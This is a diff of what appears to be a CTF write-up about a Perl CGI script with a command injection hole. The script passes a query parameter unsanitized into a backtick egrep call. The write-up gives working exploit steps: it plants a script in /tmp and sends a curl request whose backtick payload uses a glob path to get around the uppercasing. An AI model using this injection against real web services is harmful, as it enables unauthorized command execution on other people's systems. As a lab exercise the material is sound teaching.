@@ -25,13 +25,11 @@ print "Content-type: text/html\n\n";
 
 sub t {
   $nn = $_[1];
-  $xx = $_[0];         🟡 receives query string, the 1st part thereof
-  $xx =~ tr/a-z/A-Z/;  🟡 `tr` all lowercase alpha to caps
-  $xx =~ s/\s.*//;     🟡 `sub` all whitespaces w/ nothing 
+  $xx = $_[0];         👈 
+  $xx =~ tr/a-z/A-Z/;  👈 
+  $xx =~ s/\s.*//;     👈 
 
-  🔵 Vulnerability - Backtick Injection
-
-  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`; 👈 
   foreach $line (@output) {
       ($f, $s) = split(/:/, $line);
       if($s =~ $nn) {
@@ -53,13 +51,14 @@ n(t(param("x"), param("y")));
 ```
 
 - `input (x)` is not sanitized before inserted in the cmd 
-- PERL runs this unsanitized cmd as part of `egrep`
+- `""` - interpolates variables inside double quotes
+- `egrep` - PERL runs this unsanitized cmd as part of `egrep`
 - since `/tmp/go` has `x`|777 getflag will be run
 
 ```b
-> echo "getflag > /tmp/tmp" > /tmp/go
-> chmod 777 /tmp/go
-> curl 'http://10.0.2.15:4646?x=`/*/go`'
+> echo "getflag | wall" > /tmp/GO
+> chmod 777 /tmp/GO
+> curl 'http://10.0.2.15:4646?x=`/*/GO`'
 ```
 
 there you have it in tmp tmp
